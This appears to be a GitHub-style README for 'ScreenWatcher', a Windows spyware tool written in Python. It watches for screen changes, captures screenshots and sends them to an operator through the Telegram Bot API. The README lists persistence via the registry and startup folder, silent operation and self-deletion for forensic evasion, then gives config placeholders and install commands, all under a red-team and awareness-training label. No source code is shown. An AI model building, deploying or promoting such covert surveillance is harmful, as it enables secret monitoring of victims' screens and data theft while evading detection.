# ScreenWatcher 

**Python-based utility that monitors screen changes and exfiltrates screenshots via Telegram Bot API, with self-deletion capability.**

Built for authorized penetration testing, and security awareness demonstrations.

---

## Features

- Real-time screen-change detection using pixel-diff analysis (mss + numpy)
- Automatic screenshot capture on visual change
- Telegram Bot API exfiltration
- Multiple persistence mechanisms (Registry / Startup Folder)
- Self-deletion after execution (low footprint / forensic evasion)
- Compiled to standalone `.exe` via PyInstaller — no Python runtime required
- Silent operation (no console window)

---

## Use Cases

- Red team persistence and exfiltration demonstrations
- Testing endpoint detection & response (EDR) capabilities
- Security awareness training — demonstrating how low-footprint spyware operates
- Physical security audits — monitoring unattended workstations

---

## Requirements

- Python 3.8+
- Dependencies: `mss`, `numpy`, `Pillow`, `requests`
- Windows (for Registry/Startup persistence)
- ## Change in desktop.py

BOT_TOKEN = "YOUR_BOT_TOKEN"    # Telegram bot token from @BotFather
CHAT_ID   = "YOUR_CHAT_ID"      # Your Telegram user/group chat ID



```bash
pip install mss numpy pillow requests pyinstaller
python desktop.py




